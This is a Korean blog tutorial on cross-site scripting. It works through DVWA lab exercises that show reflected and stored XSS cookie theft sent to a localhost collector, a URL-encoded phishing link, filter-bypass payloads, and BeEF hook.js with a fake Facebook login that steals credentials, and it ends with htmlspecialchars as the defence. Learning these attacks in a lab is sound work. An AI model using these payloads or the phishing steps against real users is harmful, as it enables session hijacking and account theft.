---
title: "XSS(크로스사이트스크립팅) 공격"
description: "- js와 같은 스크립트 코드를 취약한 웹 애플리케이션을 통해 다른 사용자에게 전달하여 클라이언트쪽 웹 브라우저를 공격하는 기법 - 와 같은 입력값이 그대로 웹페이지에 표시되면 위험하다 - js를 통해 세션쿠키를 탈취할 수 있다. 세션쿠키를 탈취 할 경우 사용자 본인이 아님에도 본인인것처럼 로그인이 가능해지며, 이는 일반 사용자가 아닌 관리자 세션쿠키를 탈취 할 경우 관리자 권한으로 웹 애플리케이션을 전체 컨트롤이 가능해지기 때문에 xss공격에 대응하지않으면 심각한 피해를 볼 수 있다. --- 2가지 xss 공격 "
pubDate: 2021-07-21T07:35:27.000Z
updatedDate: 2021-07-21T11:47:06.000Z
tags: []
category: "web-hacking"
slug: "xsskeuroseusaiteuseukeuripting-gonggyeok"
draft: false
originalUrl: "https://siltare.tistory.com/13"
ogImage: "https://img1.daumcdn.net/thumb/R800x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FcxXikd%2Fbtq97Op3DDx%2FAAAAAAAAAAAAAAAAAAAAAE-2jRDQv9SYUWbyasMaKsDPM_7BFYAO11Dh53GMCxtB%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1780239599%26allow_ip%3D%26allow_referer%3D%26signature%3DzxzwoPlGJ9SqB1EH4OowNb7KU0c%253D"
---

- js와 같은 스크립트 코드를 취약한 웹 애플리케이션을 통해 다른 사용자에게 전달하여 클라이언트쪽 웹 브라우저를 공격하는 기법

- 와 같은 입력값이 그대로 웹페이지에 표시되면 위험하다

- js를 통해 세션쿠키를 탈취할 수 있다.

세션쿠키를 탈취 할 경우 사용자 본인이 아님에도 본인인것처럼 로그인이 가능해지며,

이는 일반 사용자가 아닌 관리자 세션쿠키를 탈취 할 경우 관리자 권한으로 웹 애플리케이션을 전체 컨트롤이 가능해지기 때문에

xss공격에 대응하지않으면 심각한 피해를 볼 수 있다.

---

## 2가지 xss 공격 방법

---

**1. Reflected XSS 공격(리플렉티드)**

웹서버에서 앵무새처럼 스크립트를 반사하는 형태를 띄어 Reflected라는 이름이 붙혀진 공격입니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
Reflected XSS 공격

csrf공격때와 마찬가지로 사용자에게 피싱 메일을 전달합니다.

해당 메일의 링크에는 세션쿠키를 가져오는 스크립트가 작성이 되어있습니다.

그리고 **사용자가 메일을 열어 링크를 클릭하는 순간 스크립트코드가 삽입된 요청이 웹서버로 전송**됩니다.

웹서버는 앵무새와 같기때문에 **스크립트 코드를 반사**시켜

**그대로 사용자 웹브라우저에서 스크립트 코드가 실행**되게됩니다.

그럼 사용자의 세션쿠키는 해커에게 넘어가게 되고, 받은 세션쿠키를 이용하여 사용자 권한으로 접속하게 됩니다.

---

**2.Stored XSS공격(스토어드)**

이는, 위와같이 바로 반사되지않고, 한번 저장했다가 실행되는 형태를 갖고있는 공격입니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
Stored XSS 공격

해당 공격은 메일로 피싱하지않고 **스크립트 입력이 가능한 방명록이 있는 웹사이트에 사용자 세션쿠키를 탈취하는 코드를 업로드** 합니다.

아무것도 모르는 사용자가 **해당 방명록을 클릭하여 접속 할 경우 스크립트코드가 자동으로 웹브라우저에서 실행**이 됩니다.

그 이후부터는 Reflected xss와 마찬가지로 해커가 세션쿠키를 탈취해 사용자 권한으로 접속하게 됩니다.

---

## Reflected XSS 공격 실습

**: 난이도 하**

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
reflected xss 실습 input

처음 reflected xss 실습창을 들어가보면 이름을 묻는 input창이 나옵니다.

여기서 아무거나 입력을 해줍니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
name 입력 시

그랬더니 똑같이 사용자 입력값을 반사해서 내뱉습니다.

그렇다는건 xss를 한번 시도해볼수있는데 우선 확인 차 스크립트코드를 넣어봅시다.

예시로 우선 ** alert(1) **을 넣어봅시다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
스크립트 코드 작성 후 submit 결과ㅣ

스크립트가 입력한대로 실행이 되었습니다.

그럼 해당 쿠키값을 얼럿으로 띄어보겠습니다.

** alert(document.cookie$) **

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
얼럿으로 쿠키 띄우기

마찬가지로 해당 쿠키값이 출력 되었습니다.

그렇다면 이번에는 사용자의 쿠키값을 해커가 관리하는 시스템으로 전달하는것을 해보겠습니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
(좌) 해커가 관리하는 웹호스트,(우) 사용자가 보는 사이트

우선 왼쪽 터미널이 해커가 관리하는 웹호스트라고 가정해봅시다.

터미널에 **tail -f /opt/lampp/logs/access_log**를 입력하게 되면 웹사이트의 로그가 남게됩니다.

또한 tail -f 옵션을 사용했기때문에 그 이후로의 로그도 함께 찍히게 됩니다.

한번 테스트 해봅시다.

input창에 해당 소스코드를 넣어봅니다.

** document.location = 'http://127.0.0.1/cookie?' + document.cookie **

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
해당 스크립트가 실행 된 모습

이렇게 되면 해커가 관리하는 웹호스트에 사용자의 쿠키값이 담기게 됩니다.

우측 사용자가 보는 화면에서는 에러가 발생하는데 이는 스크립트를 통해서 사용자에게 티 안나게 작성하는 방법도 있다고 한다.(이건 js와 관련이 있으니 나중에 따로 찾아보도록 하자)

그런데 여기서 **사용자가 직접 저런 코드를 입력할 일은 없습니다.**

그렇기때문에 **피싱을 이용하여 사용자가 모르게 스크립트 코드를 실행시키도록 만들어야합니다.**

우선 해당 dvwa페이지로 다시 돌아가서 정상적인 요청을 했을 시에

name 파라미터값에 사용자의 입력값이 들어가는것을 확인 할 수 있습니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
 tare 입력한 결과

이제 #의 앞부분까지 복사를 하여 피싱할 이메일로 넘어가봅시다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
gmail 쓰기

우선 상단 받는사람메일주소는 꼭 본인 이메일을 작성하길 바란다.

그리고 여기부분을 드래그 하여 하단 url삽입 버튼을 클릭한다.

아까 **위에서 복사한 url을 붙혀놓고 스크립트 부분을 name뒤에 붙혀넣는다.**

여기서 주의 할 점은 **G메일은 url인코딩을 사용해서 넣어야하기때문에 =,%,+와 같은 특수문자는 url인코딩을**

**이용해 변경하여 넣어줍니다**.

**localhost/dvwa/vulnerabilities/xss_r/?name=**

** document.location %3d 'http://127.0.0.1/cookie%3f' %2b document.cookie **

이메일 전송 후 메일을 열어 링크를 걸어두었던 부분을 클릭합니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
피싱메일 링크 클릭 시

링크를 클릭하자마자 사용자에게는 우측 이미지처럼 웹사이트가 표시될것이며

해커의 웹호스팅서버에서는 해당 쿠키값이 그대로 전달이 되었습니다.

## Stored XSS 공격 실습

**: 난이도 하**

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
Stored XSS 공격 실습 화면

우선 dvwa에서 stored XSS 실습페이지를 가면 이렇게 방명록을 등록할수있는 부분이 나온다.

stored는 위 reflected와는 다르게 **해당 게시글에 진입한 모든 사용자의 쿠키값을 탈취 할 수 있다. 그래서 더더욱 위험하다**

우선 name부분에는 아무거나 입력을 해주고 massage부분에 해당 스크립트를 넣어준다.

** document.location = 'http://127.0.0.1/cookie?' + document.cookie **

그런데 해당 massage부분이 입력되다가 중간에 짤리는 현상을 볼 수 있다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
메세지 제한 속성

이는 해당 **textarea에 maxlength를 걸어서 입력 제한을 둔 것이다 50을 500으로 변경 후 다시 massage에 스크립트를 입력해보자.**

그 후 sign guestbook을 클릭하여 글을 등록하면 페이지가 없다고 에러메세지가 뜬다.

이는 **게시물에 진입했을때 스크립트가 바로 실행되었기 때문에 에러페이지가 뜨는것이다.**

이전과 동일하게 터미널에서 **tail -f /opt/lampp/logs/access_log **를 입력해서 로그를 확인해보자.

그 다음 dvwa에서 다른 메뉴를 클릭했다가 xss(stored)를 클릭해 내가 입력했던 게시판에 들어가보자.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
게시판에 진입하자마자 뜨는 화면

**게시판에 들어가자마자 쿠키값이 찍히며 페이지 오류가 뜬다.**

이처럼 stored xss는** 다수의 사용자 쿠키값을 대량 탈취할 수 있기때문에 꼭 대응을 해줘야한다.**

추가) 실습을 위해서는 해당 게시물을 지워야하기때문에 dvwa 초기화를 진행해줘야 한다.

초기화방법=> **setup/reset DB 클릭 > create/reset database 클릭**

## BeEF 프레임워크

**: 난이도 하**

**beef는 웹브라우저의 취약점을 공격하는데에 유용한 툴이다.**

**자세한건 구글링 해보자..**

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
BeEF 첫 실행 화면

BeEF의 초기 아이디와 패스워드는 beef/beef이다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
로그인 후 화면

beef에서 online browsers라고 있는데 지금은 아무것도 안뜨지만 xss공격을 받은 페이지라면 여기에 표시가 됩니다.

그리고 beef초기 화면을 보게 되면

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)

hook.js파일을 사용하라고 나오는데 여기서 **해당 스크립트를 xss공격에 취약한 곳에 넣으면 beef에서 클라이언트를 컨트롤 할 수 있게 됩니다.**

해당 소스를 복사 후 dvwa의 xss(reflected) 페이지로가서 해당 input에 복사한 소스코드를 삽입 후 submit을 눌러줍니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
소스코드를 붙혀넣어 xss공격을 시도 한 후 beef의 화면

그럼 이렇게 xss공격이 먹힌 페이지에 대한 다양한 정보들이 나오게 됩니다.

이중에 **쿠키정보**도 들어있습니다. 그리고 해당 beef탭에 commands를 들어가게되면

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)

지금 beef에 온라인되어있는 클라이언트에 대해서 각종 공격을 수행 할 수 있습니다.

이중에서 **social Engineering > pertty Theft** 를 들어가보면

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)

페이스북같은 소셜네트워크 사이트의 로그인페이지를 비슷하게 만들어서 띄어줌으로써

**사용자가 페이스북에 아이디와 패스워드를 작성하여 아이디와 패스워드를 탈취하는데 사용되는 기능입니다.**

확인을 눌러서 창을 띄어보면

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)

이 처럼 **페이스북 로그인 창 처럼 xss 공격한 페이지에 뜨게 됩니다.**

여기서 사용자가 아이디와 패스워드를 입력 한다면 beef의 히스토리부분에 사용자가 입력한 아이디와 패스워드가 입력되게 됩니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
command results에 사용자가 입력한 아이디와 패스워드가 나와있다.

이처럼 **xss공격뿐만아니라 사용자의 sns계정까지 탈취할 수 있게 됩니다.**

이외에도 beef에는 다양한 기능들이 있는데 그 외의 기능들은 각자 연구해보길 바랍니다.

**물론 연구는 본인에게만 진행하셔야 합니다. 절때 타인에게 시도해서는 안됩니다.**

---

## Reflected XSS 공격 : 난이도 중급

우선 난이도 하에서 시도했던 xss 스크립트 공격을 해봅시다.

**alert(1)**

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)

해당 스크립트가 실행되지 않고 문자열로만 나오는것을 확인 할 수 있습니다.

그럼 해당 소스코드를 보도록 하겠습니다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
중급 소스코드

해당 소스코드를 보면 스크립트라는 태그를 지워주는 코드를 사용하였습니다.

그렇다면 대문자로 하게된다면 어떻게 될까요?

**alert(1)**

대문자로 넣으니 실행이 되었습니다. 대문자로 넣는 방법 이외에도 해당 소스코드는 스크립트 태그를 한번 지워주는걸로 작성이 되었기 때문에 스크립트 태그 사이에 스크립트 태그를 한번 더 입력해보겠습니다.****

****ipt>alert(1)

이또한 역시 스크립트 태그를 한번만 지워주기때문에 해당 xss공격이 먹힙니다.

해당 **스크립트 태그가 먹힌다는것은 위에서 실습했던 모든 방법의 공격이 가능하니 패스하도록 하겠습니다.**

stored 또한 동일합니다.

---

## Reflected XSS 공격 : 난이도 상급

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
난이도 상 소스코드

우선 해당 소스코드를 먼저 보면 스크립트 태그 사이사이 소문자와 대문자 확인과 스크립트 태그사이에 우회를 막하놓은 소스코드가 확인됩니다. 이럴때에는 스크립트 태그뿐만아닌 html 코드로도 xss를 시도 해 볼 수 있습니다.

우선 Img태그와 svg태그가 있는데요

****

src에 아무런 값을 입력 후 에러가 발생되면 그 뒤에 정의된 함수가 실행되게하는 구문입니다.

**window.location.assign**를 이용하면 리다이렉트를 시킬수있는데 hacked.php(임의파일=악성코드)같은 페이지로 리다이렉트를 시킬수있게됩니다.

****

onload에다가 함수를 정의해두었기때문에 페이지가 요청되었을때 해당 함수가 실행 됩니다.

**해당 hacked.php 같은 페이지는 한번 직접 연구해서 만들어보시길바랍니다.**

**이외에도 구글에 xss cheat sheet를 검색하시면 다양한 공격예제와 우회기법들을 참고 할 수 있습니다.**

이처럼 특정 태그를 막는것은 불완전한 대응이라고 볼 수 있습니다.

---

## XSS 공격 대응 방법

우선 앞전의 방법과 동일하게 스크립트를 입력할 경우에

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)

우리가 입력한 스크립트 구문이 그대로 출력 되게 됩니다. 그리고 내가 입력한 스크립트가 실행 되지 않고 있는걸 확인 할 수 있습니다.

그렇다면 소스코드를 살펴보면,

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)

사용자에게 입력받는 입력값을 **htmlspecialchars**이라는 함수로 변경해주고 있습니다.

이는 php 공식 홈페이지에 가보면

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)
htmlspecialchars 함수 설명

이렇게 **다양한 특수문자들을 문자열 형태로 변경시켜주는 함수입니다.**

**태그에서 사용되는 <> 이러한 특수문자들도  와 같은 문자열로 변경이 되었기 때문에 스크립트가 실행되지않았던것입니다.**

그렇다면 해당 dvwa에서 개발자 도구를 열어 내가 입력한 스크립트 태그가 어떻게 변경이 되었는지 확인 해 봅시다.

![image](/images/migrated-tistory/xsskeuroseusaiteuseukeuripting-gonggyeok/img.png)

이렇게 태그의 형태가 아닌 문자열로 들어가있는것을 확인 할 수 있습니다.

이러한 htmlspecialchars 함수를 통해서도 xss 공격에 대응할 수 있지만 앞전 모든 공격에 있어서 **사용자에게 입력값을 받을때는**

**정확한 값을 확인하는 검증단계가 있어야 다양한 공격 등에 대응 할 수 있습니다.**
